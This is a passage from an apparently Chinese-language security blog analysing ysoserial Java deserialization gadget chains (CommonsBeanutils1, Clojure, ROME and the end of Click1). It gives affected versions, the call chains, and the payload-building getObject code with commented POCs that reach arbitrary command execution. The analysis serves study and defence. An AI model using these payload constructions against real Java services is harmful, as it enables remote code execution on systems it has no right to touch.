(NoSuchMethodException var9) &#123;</span><br><span class="line">                msg = <span class="string">&quot;No matching getter method found for property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &quot;</span> + source.getClass().getName();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(msg, var14);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该方法是为传入的 property 属性头部添加 <code>get</code> 三个字符再返回，因此回到 getObjectPropertyValue 方法中调用method.invoke(source) 方法时，method 参数值对应的是 “get” + 传入的 name 变量。</p>
<p>而这里 name 变量值是由 Column#name 属性值决定的，因此控制 Column#name 属性值就可以调用任意类中以 <code>get</code> 开头的无参方法。可以直接通过构造函数控制 Column#name 属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toGetterName</span><span class="params">(String property)</span> </span>&#123;</span><br><span class="line">    HtmlStringBuffer buffer = <span class="keyword">new</span> HtmlStringBuffer(property.length() + <span class="number">3</span>);</span><br><span class="line">    buffer.append(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">    buffer.append(Character.toUpperCase(property.charAt(<span class="number">0</span>)));</span><br><span class="line">    buffer.append(property.substring(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><blockquote>
<p>思路同 CC2、Click1<br>改用 BeanComparator 作为比较器</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>commons-beanutils:1.9.2</li>
<li>commons-collections:3.1</li>
<li>commons-logging:1.2</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            BeanComparator.compare()</span><br><span class="line">                PropertyUtils.getProperty()</span><br><span class="line">                    PropertyUtilsBean.getProperty()</span><br><span class="line">                        PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                            PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/OAfq1WD6UhIbRQv.png" >

<p>ysoserial.payloads.CommonsCollections7#getObject 和 CC2 基本相同，中间使用 BeanComparator 作为比较器。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 承载恶意代码</span></span><br><span class="line">	<span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较器</span></span><br><span class="line">	<span class="comment">// mock method name until armed</span></span><br><span class="line">	<span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 创建优先队列</span></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">	<span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">	<span class="comment">// stub data for replacement later</span></span><br><span class="line">	queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">	queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 设置比较器调用 getoutputProperties 方法</span></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">	Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 替换队列中的数据</span></span><br><span class="line">    <span class="comment">// switch contents of queue</span></span><br><span class="line">	<span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">	queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">	queueArray[<span class="number">1</span>] = templates;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BeanComparator#compare 方法中调用了 PropertyUtils.getProperty 获取属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(T o1, T o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.property == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, <span class="keyword">this</span>.property);   <span class="comment">// 这里</span></span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, <span class="keyword">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.internalCompare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PropertyUtils#getProperty 方法创建 PropertyUtilsBean，并调用其 getProperty 方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PropertyUtilsBean#getProperty 方法用于执行任务，调用 getNestedProperty 方法。具体是调用 getSimpleProperty 方法，然后调用对象的 getter 方法获取属性，实际调用 TemplatesImpl.getOutputProperties</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h2><blockquote>
<p>Clojure 是 Lisp 编程语言在 Java 平台上的现代、动态及函数式方言；说白了就是用 Clojure 在 Java 中执行 Lisp 代码。<br>利用 HashMap 返序列化执行 hashCode 方法的特性，将其替换为调用 AbstractTableModel$ff19274a.hashCode</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>clojure:1.8.0</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		HashMap.readObject()</span><br><span class="line">			AbstractTableModel$ff19274a.hashCode()</span><br><span class="line">				clojure.core$comp$fn__4727.invoke()</span><br><span class="line">					clojure.core$constantly$fn__4614.invoke()</span><br><span class="line">					clojure.main$eval_opt.invoke()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/hIj4DHVNTepsAaw.png" >

<p>ysoserial.payloads.Clojure#getObject 返回的 targetMap(HashMap) 包含 <code>model(AbstractTableModel$ff19274a) -&gt; null</code> 的映射，model.__initClojureFnMappings = fnMap(HashMap)，fnMap中的键为 hashCode，值为 g、f(core$comp$fn__4727)。</p>
<p>反序列化时调用 HashMap.readObject，进一步调用 AbstractTableModel$ff19274a.hashCode，因为 __clojureFnMap 有值所以调用 core$comp$fn__4727.invoke 最终调用的是构造的 <code>clojure.core\$comp().invoke(clojure.main\$eval_opt(), clojure.core\$constantly().invoke(clojurePayload))</code>。clojure.core$constantly().invoke(clojurePayload) 返回 core$constantly$fn__4614 对象，其属性 x 为构造的 payload，后续进入 clojure.main$eval_opt().invokeStatic 的 for 循环时执行指令。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractTableModel$ff19274a</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var10000 = RT.get(<span class="keyword">this</span>.__clojureFnMap, <span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var10000 != <span class="keyword">null</span> ? ((Number)((IFn)var10000).invoke(<span class="keyword">this</span>)).intValue() : <span class="keyword">super</span>.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$comp$fn__4727</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((IFn)<span class="keyword">this</span>.f).invoke(((IFn)<span class="keyword">this</span>.g).invoke());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    IFn var10000 = (IFn)<span class="keyword">this</span>.f;</span><br><span class="line">    IFn var10001 = (IFn)<span class="keyword">this</span>.g;</span><br><span class="line">    Object var10002 = x;</span><br><span class="line">    x = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> var10000.invoke(var10001.invoke(var10002));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main$eval_opt</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object str)</span> </span>&#123;</span><br><span class="line">    Object eof = <span class="keyword">new</span> Object();</span><br><span class="line">    Object var10004 = str;</span><br><span class="line">    str = <span class="keyword">null</span>;</span><br><span class="line">    Object reader = <span class="keyword">new</span> LineNumberingPushbackReader((Reader)(<span class="keyword">new</span> StringReader((String)var10004)));</span><br><span class="line">    push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    <span class="keyword">for</span>(Object input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7422(reader, eof))).invoke(); !Util.equiv(input, eof); input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7424(reader, eof))).invoke()) &#123; <span class="comment">// 执行指令</span></span><br><span class="line">        Object var10000 = input;</span><br><span class="line">        input = <span class="keyword">null</span>;</span><br><span class="line">        Object value = eval.invokeStatic(var10000);</span><br><span class="line">        <span class="keyword">if</span> (Util.identical(value, (Object)<span class="keyword">null</span>)) &#123;</span><br><span class="line">            var10000 = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object[] var5 = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">            Object var10003 = value;</span><br><span class="line">            value = <span class="keyword">null</span>;</span><br><span class="line">            var5[<span class="number">0</span>] = var10003;</span><br><span class="line">            prn.invokeStatic(ArraySeq.create(var5));</span><br><span class="line">        &#125;</span><br><span class="line">        push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$constantly$fn__4614</span></span><br><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC 构造如下，注释掉其中两行也可以执行成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;?, ?&gt; getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转义</span></span><br><span class="line">    String cmd = Strings.join(Arrays.asList(command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\&quot;</span>).split(<span class="string">&quot; &quot;</span>)), <span class="string">&quot; &quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在 Clojure 包中调用 shell 命令</span></span><br><span class="line">    <span class="keyword">final</span> String clojurePayload =</span><br><span class="line">        String.format(<span class="string">&quot;(use &#x27;[clojure.java.shell :only [sh]]) (sh %s)&quot;</span>, cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    Map&lt;String, Object&gt; fnMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">	<span class="comment">// fnMap.put(&quot;hashCode&quot;, new clojure.core$constantly().invoke(0));</span></span><br><span class="line">    </span><br><span class="line">    AbstractTableModel$ff19274a model = <span class="keyword">new</span> AbstractTableModel$ff19274a();</span><br><span class="line">	<span class="comment">// model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span></span><br><span class="line">    </span><br><span class="line">    HashMap&lt;Object, Object&gt; targetMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">	targetMap.put(model, <span class="keyword">null</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 添加到 Map 中</span></span><br><span class="line">    fnMap.put(<span class="string">&quot;hashCode&quot;</span>,</span><br><span class="line">			<span class="keyword">new</span> clojure.core$comp().invoke(</span><br><span class="line">					<span class="keyword">new</span> clojure.main$eval_opt(),    <span class="comment">// 函数体为空</span></span><br><span class="line">					<span class="keyword">new</span> clojure.core$constantly().invoke(clojurePayload))); <span class="comment">// core$constantly 函数体为空</span></span><br><span class="line">    <span class="comment">// 通过 PersistentArrayMap 转换 fnMap 的属性</span></span><br><span class="line">	model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> targetMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>clojure.core$constantly().invoke(clojurePayload) 实际调用 core$constantly$fn__4614(clojurePayload)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">core</span>$<span class="title">constantly</span> <span class="keyword">extends</span> <span class="title">AFunction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> core$constantly() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">        Object var10002 = x;</span><br><span class="line">        x = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> core$constantly$fn__4614(var10002);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        Object var10000 = var1;</span><br><span class="line">        var1 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> invokeStatic(var10000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就一个赋值操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>clojure.core$comp().invoke 实际调用 core$comp$fn__4727</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Object var2)</span> </span>&#123;</span><br><span class="line">    Object var10000 = var1;</span><br><span class="line">    var1 = <span class="keyword">null</span>;</span><br><span class="line">    Object var10001 = var2;</span><br><span class="line">    var2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> invokeStatic(var10000, var10001);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object f, Object g)</span> </span>&#123;</span><br><span class="line">    Object var10002 = g;</span><br><span class="line">    g = <span class="keyword">null</span>;</span><br><span class="line">    Object var10003 = f;</span><br><span class="line">    f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> core$comp$fn__4727(var10002, var10003);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就一个赋值操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$comp$fn__4727(Object var1, Object var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.g = var1;</span><br><span class="line">    <span class="keyword">this</span>.f = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>model.__initClojureFnMappings(PersistentArrayMap.create(fnMap)); 也就是赋值操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">__updateClojureFnMappings</span><span class="params">(IPersistentMap var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.__clojureFnMap = (IPersistentMap)((IPersistentCollection)<span class="keyword">this</span>.__clojureFnMap).cons(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><blockquote>
<p>ROME 是 RSS/Atom 订阅框架<br>和 CC2 类似，使用 TemplatesImpl 承载恶意代码；和 URLDNS 类似，利用 HashMap 的反序列化操作<br>通过 ObjectBean.hashCode 触发</p>
</blockquote>
<p>适用版本</p>
<ul>
<li>rome:1.0</li>
</ul>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ObjectBean.hashCode()</span><br><span class="line">                EqualsBean.beanHashCode()</span><br><span class="line">                    ObjectBean.toString()</span><br><span class="line">                        ToStringBean.toString()</span><br><span class="line">                            ToStringBean.toString(String)</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/kIZ8fRB4lNpuyA9.png" >

<p>ysoserial.payloads.ROME#getObject 十分简短，需要注意的是这里必须通过两个 ObjectBean 才能触发漏洞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 TemplatesImpl 承载执行代码</span></span><br><span class="line">    Object o = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过两个 ObjectBean 达成触发条件</span></span><br><span class="line">    ObjectBean delegate = <span class="keyword">new</span> ObjectBean(Templates.class, o);</span><br><span class="line">    ObjectBean root  = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造 HashMap</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(root, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果只用 <code>ObjectBean(Templates.class, TemplatesImpl)</code> 构造 HashMap，则反序列化时报错</p>
<ul>
<li>构造 POC 用的是 <code>ObjectBean(ObjectBean.class, ObjectBean(Templates.class, TemplatesImpl))</code></li>
</ul>
<p>因为计算哈希值时会对 value(TemplatesImpl) 调用 <code>ObjectBean.hashCode</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is not instance of class com.sun.syndication.feed.impl.ObjectBean</span><br><span class="line">	at com.sun.syndication.feed.impl.EqualsBean.&lt;init&gt;(EqualsBean.java:85)</span><br><span class="line">	at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:74)</span><br><span class="line">	at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:56)</span><br><span class="line">	at ysoserial.payloads.ROME.getObject(ROME.java:38)</span><br></pre></td></tr></table></figure>

<p>当 HashMap 反序列化时会对元素计算哈希值，调用对象的 hashCode 方法，这里就是 <code>ObjectBean.hashCode</code> 方法，实际调用的是 <code>EqualsBean.beanHashCode</code>，然后进一步调用 <code>ObjectBean.toString</code> 方法返回 <code>ToStringBean.toString</code>，在这个函数中会触发 <code>TemplatesImpl.getOutputProperties</code>。</p>
